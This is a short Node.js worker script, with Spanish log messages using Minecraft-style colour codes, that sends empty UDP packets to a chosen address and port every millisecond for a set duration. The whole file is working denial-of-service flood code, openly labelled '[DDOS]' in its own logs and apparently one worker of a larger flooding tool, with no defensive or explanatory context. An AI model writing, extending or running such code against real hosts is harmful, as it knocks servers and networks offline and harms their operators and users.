const { parentPort } = require('worker_threads');

parentPort.on('message', async ({ address, port, time, thread }) => {
  const dgram = require('dgram');
  const client = dgram.createSocket('udp4');

  let task = null;

  setTimeout(() => {
    task = setInterval(() => {
      client.send('', port, address, (error) => {
        if (error) {
          console.log(`§c[ERROR #${thread}] no se pudo enviar paquete a ${address}:${port} [${error}]`)
          clearInterval(task);
          console.log(`§c[DDOS] #${thread}] Detenido`)
          return;
        }
        console.log(`§a[UDP] §f#${thread} §aEnviando a §f${address}:${port}...`)
      });

    }, 1)
  }, 3000)

  setTimeout(() => {
    clearInterval(task);
    console.log(`§c[UDP] #${thread}] Detenido`)
  }, 1024 * 60 * time);

  console.log(`§a[UDP] #${thread}] Comenzando`)
});
